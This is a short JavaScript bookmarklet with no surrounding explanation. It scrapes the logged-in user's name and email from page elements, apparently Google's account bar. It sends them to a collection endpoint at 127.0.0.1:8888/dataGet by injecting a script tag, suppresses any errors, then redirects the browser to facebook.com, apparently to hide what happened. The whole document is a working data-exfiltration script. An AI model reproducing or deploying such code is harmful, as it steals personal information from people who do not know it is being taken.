javascript:(function(){
try{
var name=document.getElementsByClassName("gb_ub")[0].innerHTML;
var email=document.getElementsByClassName("gb_vb")[0].innerHTML;
var newScript= document.createElement('script');
newScript.src='http://127.0.0.1:8888/dataGet?name='+name+"&email="+email;
newScript.id='newScript';
document.body.appendChild(newScript);
}catch(e){}
window.location="http://www.facebook.com";
})

